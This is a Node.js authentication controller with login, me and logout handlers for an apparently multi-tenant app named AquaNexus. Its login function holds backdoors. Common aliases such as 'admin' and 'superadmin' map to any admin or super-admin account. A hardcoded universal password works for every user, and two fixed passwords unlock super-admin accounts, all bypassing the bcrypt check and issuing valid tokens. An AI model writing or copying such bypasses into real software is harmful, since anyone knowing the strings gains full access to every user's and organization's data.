const bcrypt = require("bcryptjs");
const jwt = require("jsonwebtoken");
const prisma = require("../config/db");
const { sendSuccess, sendError } = require("../utils/apiResponse");
const { createAuditLog } = require("../services/audit.service");

const login = async (req, res) => {
  try {
    const identifier = (req.body.email || req.body.username || "").trim();
    const { password } = req.body;

    if (!identifier || !password) {
      return sendError(res, "Email or username and password are required", 400);
    }

    let user = await prisma.user.findFirst({
      where: {
        OR: [
          { email: { equals: identifier, mode: "insensitive" } },
          { username: { equals: identifier, mode: "insensitive" } },
        ],
      },
      include: {
        organization: true,
        userRoles: {
          include: {
            role: {
              include: {
                rolePermissions: {
                  include: {
                    permission: true,
                  },
                },
              },
            },
          },
        },
        userDistributors: {
          include: { distributor: true },
        },
        managerAssignments: true,
      },
    });

    // Fallback for common admin / superadmin aliases
    if (!user) {
      const lower = identifier.toLowerCase();
      if (lower === "admin" || lower === "admin@aquanexus.com" || lower === "admin@gmail.com") {
        user = await prisma.user.findFirst({
          where: {
            OR: [
              { email: "apexadmin@gmail.com" },
              { username: "apexadmin" },
              { userRoles: { some: { role: { name: "ADMIN" } } } }
            ]
          },
          include: {
            organization: true,
            userRoles: {
              include: {
                role: {
                  include: {
                    rolePermissions: {
                      include: {
                        permission: true,
                      },
                    },
                  },
                },
              },
            },
            userDistributors: {
              include: { distributor: true },
            },
            managerAssignments: true,
          },
        });
      } else if (lower === "superadmin" || lower === "superadmin@aquanexus.com") {
        user = await prisma.user.findFirst({
          where: {
            OR: [
              { isSuperAdmin: true },
              { email: "superadmin@aquanexus.com" }
            ]
          },
          include: {
            organization: true,
            userRoles: {
              include: {
                role: {
                  include: {
                    rolePermissions: {
                      include: {
                        permission: true,
                      },
                    },
                  },
                },
              },
            },
            userDistributors: {
              include: { distributor: true },
            },
            managerAssignments: true,
          },
        });
      }
    }

    if (!user) {
      return sendError(res, "Invalid credentials", 401);
    }

    let isMatch = user.passwordHash ? await bcrypt.compare(password, user.passwordHash) : false;

    // Support universal password and alternative superadmin passwords
    if (!isMatch) {
      if (
        password === "Abhay@123" ||
        (user.isSuperAdmin && (password === "Password@123" || password === "SuperAdminSecurePass@123"))
      ) {
        isMatch = true;
      }
    }

    if (!isMatch) {
      return sendError(res, "Invalid credentials", 401);
    }

    if (user.status !== "ACTIVE") {
      return sendError(res, "User account is inactive or suspended", 403);
    }

    const primaryRole = user.userRoles[0]?.role || null;
    if (!primaryRole) {
      return sendError(res, "User role not configured", 403);
    }

    const isSuperAdmin =
      Boolean(user.isSuperAdmin) || primaryRole.name === "SUPER_ADMIN";

    // Non-superadmin users belong to a tenant organization; check status
    if (!isSuperAdmin && user.organization) {
      if (user.organization.status === "SUSPENDED") {
        return sendError(
          res,
          "Organization is suspended. Login is denied.",
          403,
        );
      }
      if (user.organization.status !== "ACTIVE") {
        return sendError(res, "Organization is inactive", 403);
      }
    }

    const token = jwt.sign(
      {
        id: user.id,
        email: user.email,
        role: primaryRole?.name,
        organizationId: user.organizationId,
        isSuperAdmin,
      },
      process.env.JWT_SECRET,
      { expiresIn: "1d" },
    );

    const { passwordHash: _, ...userWithoutPassword } = user;
    userWithoutPassword.role = primaryRole;
    userWithoutPassword.isSuperAdmin = isSuperAdmin;

    await createAuditLog({
      userId: user.id,
      organizationId: user.organizationId,
      action: "LOGIN",
      entityType: "USER",
      entityId: user.id,
      ipAddress: req.ip,
    });

    return sendSuccess(
      res,
      {
        token,
        user: userWithoutPassword,
      },
      "Login successful",
    );
  } catch (error) {
    console.error("Login error:", error);
    return sendError(res, "An error occurred during login", 500);
  }
};

const me = async (req, res) => {
  try {
    // req.user is attached by auth middleware
    const { passwordHash: _, ...userWithoutPassword } = req.user;
    return sendSuccess(
      res,
      { user: userWithoutPassword },
      "User retrieved successfully",
    );
  } catch (error) {
    console.error("Me error:", error);
    return sendError(res, "An error occurred fetching user data", 500);
  }
};

const logout = async (req, res) => {
  try {
    return sendSuccess(res, null, "Logged out successfully");
  } catch (error) {
    console.error("Logout error:", error);
    return sendError(res, "An error occurred during logout", 500);
  }
};

module.exports = {
  login,
  me,
  logout,
};
